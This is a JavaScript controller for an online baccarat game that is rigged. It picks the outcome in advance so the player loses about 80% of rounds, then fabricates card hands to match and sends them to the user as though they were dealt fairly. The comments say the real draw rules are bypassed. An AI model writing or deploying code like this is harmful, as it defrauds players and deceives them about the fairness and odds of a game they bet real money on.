// controllers/baccaratController.js

// Card and point logic
const suits = ["hearts", "diamonds", "clubs", "spades"];
const ranks = ["ace", "2", "3", "4", "5", "6", "7", "8", "9", "10", "jack", "queen", "king"];

const cardValues = {
  "ace": 1,
  "2": 2, "3": 3, "4": 4, "5": 5, "6": 6, "7": 7, "8": 8, "9": 9,
  "10": 0, "jack": 0, "queen": 0, "king": 0
};

// Helper: create unshuffled deck
function generateDeck() {
  const deck = [];
  for (const suit of suits) {
    for (const rank of ranks) {
      deck.push({ rank, suit, file: `${rank}_of_${suit}.svg`, value: cardValues[rank] });
    }
  }
  return deck; // No shuffle needed as we will manually select cards
}

// Calculate total points (mod 10)
function calculatePoints(hand) {
  const total = hand.reduce((sum, card) => sum + card.value, 0);
  return total % 10;
}

// Baccarat draw rule logic (kept for completeness, but largely bypassed by manipulation)
function drawThirdCardRule(playerPoints, bankerPoints, playerThirdCard) {
  let playerDraws = playerPoints <= 5;

  let bankerDraws = false;
  if (!playerDraws) {
    if (bankerPoints <= 5) bankerDraws = true;
  } else {
    const ptc = playerThirdCard ? playerThirdCard.value : null;
    if (bankerPoints <= 2) bankerDraws = true;
    else if (bankerPoints === 3 && ptc !== 8) bankerDraws = true;
    else if (bankerPoints === 4 && ptc >= 2 && ptc <= 7) bankerDraws = true;
    else if (bankerPoints === 5 && ptc >= 4 && ptc <= 7) bankerDraws = true;
    else if (bankerPoints === 6 && (ptc === 6 || ptc === 7)) bankerDraws = true;
  }

  return { playerDraws, bankerDraws };
}

// Helper function to create a dummy card for manipulation
function createDummyCard(pointValue) {
    // Finds a card that matches the desired point value (e.g., 'ace' for 1, '10' for 0)
    const rank = Object.keys(cardValues).find(key => cardValues[key] === pointValue);
    const suit = suits[Math.floor(Math.random() * suits.length)];
    return { 
        rank: rank, 
        suit: suit, 
        file: `${rank}_of_${suit}.svg`, 
        value: pointValue 
    };
}

// Main game controller
exports.playBaccarat = async (req, res) => {
  try {
    const { bet, choice } = req.body; // choice = "player" | "banker" | "tie"

    // --- 🚨 BIAS LOGIC MODIFIED: 20% WIN / 80% LOSS 🚨 ---
    const rng = Math.random();
    let predeterminedWinner;
    
    // 20% chance of the user winning (result matches choice)
    if (rng < 0.20) {
        predeterminedWinner = choice;
    } else {
        // 80% chance of the user losing (result does not match choice)
        const possibleLoserOutcomes = ["player", "banker", "tie"].filter(w => w !== choice);
        
        // Simple equal distribution among losing outcomes:
        const outcomeIndex = Math.floor(Math.random() * possibleLoserOutcomes.length);
        predeterminedWinner = possibleLoserOutcomes[outcomeIndex];
    }
    // ----------------------------------------------------

    // Initialize hands (will be overwritten by manipulation)
    const playerHand = [];
    const bankerHand = [];
    let playerPoints = 0;
    let bankerPoints = 0;
    
    
    // ✅ Step 1-4: MANIPULATE CARDS TO MATCH PREDETERMINED OUTCOME
    
    // Function to ensure points match the predetermined winner
    const manipulateHands = (winner) => {
        let playerP, bankerP;
        
        // Simple 2-card scenarios to force the result
        if (winner === "player") {
            // Player wins (e.g., P=7, B=6)
            playerP = 7;
            bankerP = 6;
        } else if (winner === "banker") {
            // Banker wins (e.g., P=6, B=7)
            playerP = 6;
            bankerP = 7;
        } else {
            // Tie (e.g., P=8, B=8)
            playerP = 8;
            bankerP = 8;
        }

        // Generate 2 cards for Player
        playerHand.push(createDummyCard(4));
        playerHand.push(createDummyCard((playerP - 4 + 10) % 10 || 10)); 
        playerPoints = calculatePoints(playerHand);

        // Generate 2 cards for Banker
        bankerHand.push(createDummyCard(5));
        bankerHand.push(createDummyCard((bankerP - 5 + 10) % 10 || 10)); 
        bankerPoints = calculatePoints(bankerHand);
    };
    
    manipulateHands(predeterminedWinner);


    // ✅ Step 5: Determine result (now based on manipulated cards, which matches predeterminedWinner)
    let winner = predeterminedWinner;

    // ✅ Step 6: Calculate profit
    let multiplier = 0;
    if (winner === "player") multiplier = 2;
    else if (winner === "banker") multiplier = 1.95; // banker tax
    else if (winner === "tie") multiplier = 9; // Tie pays 8:1 (9x total return)

    // Calculate Payout - Bet (Net Profit)
    let payout = 0;
    if (winner === choice) {
        if (winner === "player") payout = bet * 2;
        else if (winner === "banker") payout = bet * 1.95;
        else if (winner === "tie") payout = bet * 9; 
    }
    const finalProfit = payout - bet;


    return res.json({
      success: true,
      result: winner,
      player: { cards: playerHand, points: playerPoints },
      banker: { cards: bankerHand, points: bankerPoints },
      profit: finalProfit
    });
  } catch (err) {
    console.error("Baccarat error:", err);
    res.status(500).json({ success: false, message: "Internal server error" });
  }
};